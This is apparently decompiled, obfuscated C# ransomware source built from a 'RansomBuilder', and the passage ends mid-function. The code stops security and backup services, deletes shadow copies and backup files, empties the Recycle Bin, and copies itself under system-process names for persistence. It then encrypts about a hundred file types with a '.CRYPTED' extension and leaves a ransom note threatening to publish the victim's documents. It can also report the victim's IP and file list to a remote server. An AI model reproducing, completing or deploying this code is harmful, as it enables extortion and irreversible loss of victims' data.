using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace JcxFVLIspytryi;

internal class dHGXNFcRMdII
{
	public class PfpLRRYbwQpz
	{
		private static StringCollection NxPTUAJjtCwu = new StringCollection();

		private static List<string> RuUqysVXHcO = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			RuUqysVXHcO.Clear();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(BJOIPKGGNMyq("UmFuc29tQnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("DEAL_FOR_ACCESS_TO_YOUR_FILES") && !text.EndsWith(".CRYPTED") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(mzybAhSaESUKO))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(lJGBMVccbmYyM) * 1024.0 * 1024.0 && qfGKmrxzGCBRv == "YES")
							{
								RuUqysVXHcO.Add(text);
							}
							else if (File.Exists(text) && qfGKmrxzGCBRv == "NO")
							{
								RuUqysVXHcO.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				array3 = array2;
				foreach (string root2 in array3)
				{
					WalkDirectoryTree(root2);
				}
			}
			return RuUqysVXHcO;
		}
	}

	[CompilerGenerated]
	private sealed class GgkxJqMBNyI
	{
		public string[] wYJzFwqSaSs;

		public string[] owsAztXRuOWiM;

		public string sBLOyFdVPzNmMYf;

		public string rIlqoRxRvdBfTl;
	}

	[CompilerGenerated]
	private sealed class NTSkrnWnfynC
	{
		public GgkxJqMBNyI kpUwEsPTpsu;

		public string waZCrBvXOKq;

		public void _003CCrypt_003Eb__7()
		{
			UFsXUrlpQovQ(waZCrBvXOKq, kpUwEsPTpsu.wYJzFwqSaSs, kpUwEsPTpsu.rIlqoRxRvdBfTl, kpUwEsPTpsu.owsAztXRuOWiM, kpUwEsPTpsu.sBLOyFdVPzNmMYf);
		}
	}

	public static string kxGJXpctExeps = "EVET";

	public static string[] uVDQZtNkihbn;

	public static IEnumerable<DirectoryInfo> xCrERZpTxVTmL;

	public static byte[] VyNOnoOzmYkP = null;

	public static DirectoryInfo WUMezoNorjxC;

	public static string qfGKmrxzGCBRv = "NO";

	public static string lJGBMVccbmYyM = "100000000";

	public static List<string> eOOYapUQkACw = new List<string>();

	public static List<string> VMSgcnNrJHHs = new List<string>();

	public static string GgynnVrmWR = "NO";

	public static string lItsEzKxdxFW = "";

	public static string FhgIWsKiDISW = "NO";

	public static int gpgwmIvbKQlh = 0;

	public static string wXmpQSwRiPkO = "NO";

	public static string XqWUhhXJSgfrq = "NO";

	public static string YcCGYjyWMwzex = "YES";

	public static string ELXLaWvxhVOr = "15";

	public static string NOPjfWyOrKXiPa = "NO";

	public static string HqxzjyLXnMBc = "NO";

	public static string HHeTkxBQeHd = "NO";

	public static string fssfcpEQRzAlmNLQ = "NO";

	public static List<string> VRxIgDuDnsmGA = new List<string>
	{
		BJOIPKGGNMyq("bHNhc3MuZXhl"),
		BJOIPKGGNMyq("c3ZjaHN0LmV4ZQ=="),
		BJOIPKGGNMyq("Y3Jjc3MuZXhl"),
		BJOIPKGGNMyq("Y2hyb21lMzIuZXhl"),
		BJOIPKGGNMyq("ZmlyZWZveC5leGU="),
		BJOIPKGGNMyq("Y2FsYy5leGU="),
		BJOIPKGGNMyq("bXlzcWxkLmV4ZQ=="),
		BJOIPKGGNMyq("ZGxsaHN0LmV4ZQ=="),
		BJOIPKGGNMyq("b3BlcmEzMi5leGU="),
		BJOIPKGGNMyq("bWVtb3AuZXhl"),
		BJOIPKGGNMyq("c3Bvb2xjdi5leGU="),
		BJOIPKGGNMyq("Y3RmbW9tLmV4ZQ=="),
		BJOIPKGGNMyq("U2t5cGVBcHAuZXhl")
	};

	public static List<string> slgKwbobmDQzz = new List<string>();

	public static string gFuYSpVlTe = "NO";

	public static string egBdMvkciLhmpr = "NO";

	public static string GjlLPUvBbDbA = "NO";

	public static List<string> KLBInUGjFooMRa = new List<string>();

	public static string rIPCWqgEIIxMN = "NO";

	private static string kxBCZMbEAfCaeCl = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string iEAQOElRqnxn = "YES";

	public static string yaxeLGKtrWGdlNevm = "NO";

	public static List<string> OPfiKjMtyAfS = new List<string>
	{
		BJOIPKGGNMyq("c3RvcCBhdnBzdXMgL3k="),
		BJOIPKGGNMyq("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		BJOIPKGGNMyq("c3RvcCBtZmV3YyAveQ=="),
		BJOIPKGGNMyq("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		BJOIPKGGNMyq("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		BJOIPKGGNMyq("c3RvcCBEZWZXYXRjaCAveQ=="),
		BJOIPKGGNMyq("c3RvcCBjY0V2dE1nciAveQ=="),
		BJOIPKGGNMyq("c3RvcCBjY1NldE1nciAveQ=="),
		BJOIPKGGNMyq("c3RvcCBTYXZSb2FtIC95"),
		BJOIPKGGNMyq("c3RvcCBSVFZzY2FuIC95"),
		BJOIPKGGNMyq("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		BJOIPKGGNMyq("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		BJOIPKGGNMyq("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		BJOIPKGGNMyq("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		BJOIPKGGNMyq("c3RvcCBZb29CYWNrdXAgL3k="),
		BJOIPKGGNMyq("c3RvcCBZb29JVCAveQ=="),
		BJOIPKGGNMyq("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		BJOIPKGGNMyq("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		BJOIPKGGNMyq("c3RvcCBWU05BUFZTUyAveQ=="),
		BJOIPKGGNMyq("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		BJOIPKGGNMyq("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		BJOIPKGGNMyq("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		BJOIPKGGNMyq("c3RvcCB2ZWVhbSAveQ=="),
		BJOIPKGGNMyq("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		BJOIPKGGNMyq("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		BJOIPKGGNMyq("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		BJOIPKGGNMyq("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		BJOIPKGGNMyq("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		BJOIPKGGNMyq("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		BJOIPKGGNMyq("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		BJOIPKGGNMyq("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		BJOIPKGGNMyq("c3RvcCBBY3JTY2gyU3ZjIC95"),
		BJOIPKGGNMyq("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		BJOIPKGGNMyq("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		BJOIPKGGNMyq("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		BJOIPKGGNMyq("c3RvcCBzb3Bob3MgL3k=")
	};

	public static List<string> inxxfXkLlP = new List<string>
	{
		BJOIPKGGNMyq("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		BJOIPKGGNMyq("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		BJOIPKGGNMyq("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		BJOIPKGGNMyq("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> NNkHjTFklZeB = new List<string>
	{
		BJOIPKGGNMyq("L0lNIG1zcHViLmV4ZSAvRg=="),
		BJOIPKGGNMyq("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		BJOIPKGGNMyq("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> FLCeDOFNEqSoN = new List<string>
	{
		BJOIPKGGNMyq("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		BJOIPKGGNMyq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		BJOIPKGGNMyq("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> HAWbgyYPBizjGZ = new List<string>
	{
		BJOIPKGGNMyq("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		BJOIPKGGNMyq("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		BJOIPKGGNMyq("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		BJOIPKGGNMyq("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		BJOIPKGGNMyq("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		BJOIPKGGNMyq("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string mQJKCSmOEF = "NO";

	public static string sJUKmCxYQhN = "NO";

	internal static DateTime cZIsyUmmlKEt = new DateTime(2000, 1, 1);

	internal static DateTime eenThiPiweQ = new DateTime(2100, 1, 1);

	public static string wVuqpgdVqyhbJpw = "YES";

	public static string cCwjTHNTri = "10";

	public static string xYuevRvPotRXlg = "YES";

	public static string yZYMkhwGJERp = "NO";

	public static string owjMUyoKqwcz = "YES";

	public static string ESdsUipdnKEDsr = "NO";

	public static string BQLDbyLzAKmivX = "NO";

	public static string uoRKedrqJyMD = "NO";

	public static List<string> GnmZsSHZrmhC = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string YHeVAOIoBPH = "NO";

	public static string sCdrtpoSDq = "1";

	public static string scjldqYwDhceP = "NO";

	public static string sVGZUGcGngmeyn = "NO";

	public static string uxBClPTUFCAgbWB = "YES";

	public static string bkWYYEBKhqLbEMi = string.Empty;

	public static string lpVXYcFbJXae = "NO";

	public static string kBxjTolIjadH = "NO";

	public static string oftVkZszhNRD = "NO";

	public static string ZKIRWWPDGgb = "";

	public static string JBJGmQCsMyMwO = "";

	public static string Gbzjvtwmrhik = "NO";

	public static string lahZDhWvtMR = "YES";

	public static string QNlVtwxwliD = "NO";

	public static string WZrlXvpXaHZt = "NO";

	public static string eUcsGxicDFcJAmM = "NO";

	public static string BFoDQxXwBnlr = "LOGONISOFF";

	public static string HBhhxIKqOF = "NO";

	public static string VPWWPGKRwC = "YES";

	public static string mzybAhSaESUKO = "mystartup.lnk";

	public static string bILAXdbZWAmWb = "NO";

	public static string udMsVwtcBkPD = "NO";

	[DllImport("kernel32.dll")]
	private static extern bool DefineDosDevice(uint bNIaJyMXtYz, string egsmyrbKfm, string tzQuOoTSyIC);

	[DllImport("kernel32.dll")]
	private static extern bool DeleteVolumeMountPoint(string iLVnXPEhzB);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	internal static extern bool MoveFileExW(string eywwJQnWDyd, string eeUbvlkqOmDva, uint GqxElEZdvMuOaGP);

	private static void Main(string[] args)
	{
		try
		{
			DNCBnGsFhjhNdoE.enACHFOFZAw(kxBCZMbEAfCaeCl);
		}
		catch (Exception)
		{
		}
		if (YcCGYjyWMwzex == "YES")
		{
			Thread.Sleep(int.Parse(ELXLaWvxhVOr));
		}
		if (uxBClPTUFCAgbWB == "YES")
		{
			Thread thread = new Thread(uAhrLnnZPjXDJ.mgPXBdDEDFm);
			thread.IsBackground = true;
			thread.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && BQLDbyLzAKmivX == "YES")
		{
			try
			{
				sJrXMKGJbCijJ(BJOIPKGGNMyq("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (HHeTkxBQeHd == "YES" && !hHLZIxfuPcla.ZAjRHDAEhfjBK())
		{
			hHLZIxfuPcla.iAlJUYAbMpGbG();
		}
		if (egBdMvkciLhmpr == "YES" && hHLZIxfuPcla.ZAjRHDAEhfjBK())
		{
			new MJvlipExeMOGrY().viGeMcRDDySYi(xnvLsuyGexqWJEe: false);
			new MJvlipExeMOGrY().iEerdmlWYDYWH();
		}
		if (XqWUhhXJSgfrq == "YES")
		{
			AbKhGqweWQzkLrLW.xQixkCmcmGQCwi();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (FhgIWsKiDISW == "YES" && fileName != text2)
		{
			Thread thread2 = new Thread(PVkylCXPIixr);
			thread2.IsBackground = true;
			thread2.Priority = ThreadPriority.Highest;
			thread2.Start();
		}
		if (GgynnVrmWR == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				gpgwmIvbKQlh = tDxsTULjoYzTAxD(0, VRxIgDuDnsmGA.Count);
				File.Copy(fileName, text + VRxIgDuDnsmGA[gpgwmIvbKQlh], overwrite: true);
				Process.Start(text + VRxIgDuDnsmGA[gpgwmIvbKQlh]);
				DArfblGThCiu();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (mQJKCSmOEF == "YES" && DateTime.Now < cZIsyUmmlKEt)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (sJUKmCxYQhN == "YES" && DateTime.Now > eenThiPiweQ)
			{
				DArfblGThCiu();
			}
		}
		catch
		{
		}
		foreach (string oPfiKjMtyAf in OPfiKjMtyAfS)
		{
			EiMLfqfczM("net.exe", oPfiKjMtyAf);
		}
		foreach (string item in inxxfXkLlP)
		{
			EiMLfqfczM("sc.exe", item);
		}
		foreach (string item2 in NNkHjTFklZeB)
		{
			EiMLfqfczM("taskkill.exe", item2);
		}
		foreach (string item3 in FLCeDOFNEqSoN)
		{
			EiMLfqfczM("vssadmin.exe", item3);
		}
		foreach (string item4 in HAWbgyYPBizjGZ)
		{
			EiMLfqfczM("del.exe", item4);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EiMLfqfczM("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
		}
		if (xYuevRvPotRXlg == "NO")
		{
			lItsEzKxdxFW = prYtsFQxZRyUz.zsGDZTHcIwLVT(32);
		}
		else
		{
			lItsEzKxdxFW = "2B1LD8I2V2CY6C2IA6QMIVO7V0AL63PZ";
		}
		string text3 = KaaWzlGvaVub.YZsxwrDNYaohO(lItsEzKxdxFW);
		aUNSforXsou.YCbkEXAtRvZQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), mzybAhSaESUKO), zNBxsevtbyOyot(text3), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (lahZDhWvtMR == "YES")
		{
			try
			{
				yjYoXpcYcsD();
			}
			catch
			{
			}
		}
		try
		{
			HeCMIHKFKMhKL(new string[1] { "[auto]" }, new string[102]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
				"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
				"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
				"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
				"7z", "bkp"
			}, new string[0], lItsEzKxdxFW, ".CRYPTED");
		}
		catch
		{
			DArfblGThCiu();
		}
		lItsEzKxdxFW = prYtsFQxZRyUz.zsGDZTHcIwLVT(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt");
			streamWriter.WriteLine(BJOIPKGGNMyq("KioqIFdBUk5JTkcgKioqDQoNCkltcG9ydGFudCBGaWxlcyBJbiBUaGlzIE1hY2hpbmUgSGFzIExPQ0tFRC4NCllvdXIgRmlsZXMgT05MWSBDYW4gUmVjb3ZlciBCeSBTcGVjaWFsIFVubG9ja2VyLg0KDQpJbXBvcnRhbnQgQW5kIFByaXZhdGUgRG9jdW1lbnRzIEFsc28gQ09QSUVELg0KDQpBZnRlciBUaGlzIE1lc3NhZ2UgVGltZSBGb3IgUGF5bWVudCBJcyBMaW1pdGVkLg0KQWZ0ZXIgVGltZSBMaW1pdCBOZXh0IFBheW1lbnQgV2lsbCBCZSB4Mg0KDQpOZXh0IFN0ZXAgSXMgUHVibGlzaCBGaWxlcyBBbmQgRG9jdW1lbnQuDQoNCllvdSBDYW4gVGVzdCAxIEZpbGUgKE1heC4gMk1CKSBUbyBVbmxvY2sNCmwxdTF0MUBzZWNtYWlsLnBybw=="));
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine(BJOIPKGGNMyq("S2V5IElkZW50aWZpZXI6IA=="));
			streamWriter.WriteLine(text3);
			if (iEAQOElRqnxn == "NO")
			{
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(BJOIPKGGNMyq("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(KLBInUGjFooMRa.Count));
			}
		}
		else
		{
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
		}
		foreach (string item5 in slgKwbobmDQzz)
		{
			if (item5 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
			{
				continue;
			}
			try
			{
				if (!File.Exists(item5 + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt", item5 + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item5 + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
				}
			}
			catch (Exception)
			{
			}
		}
		if (rIPCWqgEIIxMN == "YES")
		{
			try
			{
				if (iEAQOElRqnxn == "NO")
				{
					tPndXEuPmLa.UCwBrNBearIWr("URL", "USERNAME", "ACCESO", BJOIPKGGNMyq("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(BJOIPKGGNMyq("aHR0cDovL2ljYW5oYXppcC5jb20=")) + BJOIPKGGNMyq("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + BJOIPKGGNMyq("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(KLBInUGjFooMRa.Count) + "\r\n" + BJOIPKGGNMyq("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(KLBInUGjFooMRa) + "\r\n" + BJOIPKGGNMyq("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					tPndXEuPmLa.UCwBrNBearIWr("URL", "USERNAME", "ACCESO", BJOIPKGGNMyq("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + BJOIPKGGNMyq("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + BJOIPKGGNMyq("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(KLBInUGjFooMRa) + "\r\n" + BJOIPKGGNMyq("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (fssfcpEQRzAlmNLQ == "YES")
		{
			try
			{
				hXWdgqexDRLIc.ESdkRDxtbOmiAe(new Uri("aHR0cDovL3d3dy5teV93YWxscGFwZXJfbG9jYXRpb24uY29tL3dhbGxwYXBlci5ibXA="));
			}
			catch
			{
			}
		}
		Process.Start(BJOIPKGGNMyq("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\DEAL_FOR_ACCESS_TO_YOUR_FILES.txt");
		if (!string.IsNullOrEmpty(bkWYYEBKhqLbEMi))
		{
			try
			{
				File.Delete(bkWYYEBKhqLbEMi);
			}
			catch
			{
			}
		}
		if (kxGJXpctExeps == "EVET")
		{
			DArfblGThCiu();
		}
	}

	public static void PVkylCXPIixr()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(BJOIPKGGNMyq("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), BJOIPKGGNMyq("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int tDxsTULjoYzTAxD(int MdmaAiLkrwyALcDmeU, int grlKVgLCkE)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(MdmaAiLkrwyALcDmeU, grlKVgLCkE);
	}

	public static List<string> xBsadvoMdEDL(string XRStlXniBGGWD)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(XRStlXniBGGWD))
		{
			throw new ArgumentException();
		}
		stack.Push(XRStlXniBGGWD);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_00c8;
			}
			catch
			{
			}
			continue;
			IL_00c8:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(BJOIPKGGNMyq("UmFuc29tQnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("DEAL_FOR_ACCESS_TO_YOUR_FILES") && !fileInfo.FullName.EndsWith(".CRYPTED") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(mzybAhSaESUKO))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(lJGBMVccbmYyM) * 1024.0 * 1024.0 && qfGKmrxzGCBRv == "YES")
						{
							list.Add(fileInfo.FullName);
						}
						else if (File.Exists(fileInfo.FullName) && qfGKmrxzGCBRv == "NO")
						{
